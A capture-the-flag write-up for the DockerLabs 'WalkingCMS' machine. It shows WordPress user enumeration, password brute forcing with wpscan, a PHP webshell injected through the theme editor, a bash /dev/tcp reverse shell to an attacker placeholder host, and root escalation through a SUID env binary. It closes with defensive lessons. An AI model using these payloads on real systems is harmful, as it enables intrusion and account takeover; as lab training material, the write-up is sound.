# WalkingCMS - DockerLabs - Easy

## Summary

Linux machine with a single HTTP port exposed. The attack surface is a misconfigured WordPress site with an enumerated user, weak password, and the theme editor enabled. Initial access is achieved via a reverse shell injected into the active theme. Privilege escalation to root abuses the `/usr/bin/env` binary with the SUID bit set, executing it with `sh -p` to preserve the effective root UID.

## 1. Enumeration

### Port Scan

```sh
sudo nmap -sC -sV -p- 172.17.0.2
```

Result: single open port.

| Port | State | Service |
| --- | --- | --- |
| 80/tcp | open | PHP cli server 5.5 or later |

The root page displays the Apache2 default page.

### Directory Enumeration

```sh
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50 --exclude-length 10701
```

Key finding: `/wordpress/` (redirects to the WordPress installation).

### WordPress Enumeration

```sh
wpscan --url http://172.17.0.2/wordpress/ -U mario -P /usr/share/wordlists/rockyou.txt --password-attack wp-login
```

Key findings:

- Usuario válido: **mario** (visible en las entradas por defecto del sitio)
- XML-RPC habilitado: `http://172.17.0.2/wordpress/xmlrpc.php`
- Tema activo: **Twenty Twenty-Two v1.6** (desactualizado)
- Credenciales encontradas: `mario / love`

## 2. Exploitation

### WordPress Admin Access

Login at `http://172.17.0.2/wordpress/wp-login.php` with `mario:love`.

### Reverse Shell via Theme Editor

In the dashboard: **Appearance → Editor de archivos del tema → functions.php**

Append to the end of the file:

```php
<?php system($_GET['cmd']); ?>
```

RCE verification:

```sh
curl "http://172.17.0.2/wordpress/?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Launching the reverse shell:

```sh
# Listener en Kali
nc -lvnp 4444

# Trigger desde curl
curl "http://172.17.0.2/wordpress/?cmd=bash+-i+>%26+/dev/tcp/TU_IP/4444+0>%261"
```

Shell obtained as `www-data`.

## 3. Privilege Escalation

### SUID Binary Enumeration

```sh
find / -perm -4000 2>/dev/null
```

Exploitable binary found: `/usr/bin/env`

### Exploitation via GTFOBins

```sh
/usr/bin/env /bin/sh -p
```

The `-p` flag enables sh's privileged mode, which respects the SUID bit and preserves the effective root UID.

```sh
# whoami
root
```

## 4. Lessons Learned

- **Weak CMS credentials:** The password `love` for user `mario` was found in under a minute. Using dictionary passwords on an exposed CMS is critical risk.
- **Theme editor enabled:** WordPress's file editor allows writing arbitrary PHP. In production it must be disabled with `define('DISALLOW_FILE_EDIT', true)` in `wp-config.php`.
- **Misconfigured SUID binaries:** `env` should not have the SUID bit. Periodically audit with `find / -perm -4000` and compare against a known baseline.
- **WordPress user enumeration:** The username was visible in public posts. Disabling author exposure or using generic slugs reduces the reconnaissance surface.

* **Credenciales débiles en CMS:** La contraseña `love` para el usuario `mario` fue encontrada en menos de un minuto. Usar contraseñas del diccionario en un CMS expuesto es crítico.
* **Editor de temas habilitado:** El editor de archivos de WordPress permite escribir PHP arbitrario. En producción debe deshabilitarse con `define('DISALLOW_FILE_EDIT', true)` en `wp-config.php`.
* **Binarios SUID mal configurados:** `env` no debería tener SUID. Revisar periódicamente con `find / -perm -4000` y comparar contra una baseline conocida.
* **Enumeración de usuarios WordPress:** El nombre de usuario era visible en los posts públicos. Desactivar la exposición del autor o usar slugs genéricos reduce la superficie de reconocimiento.
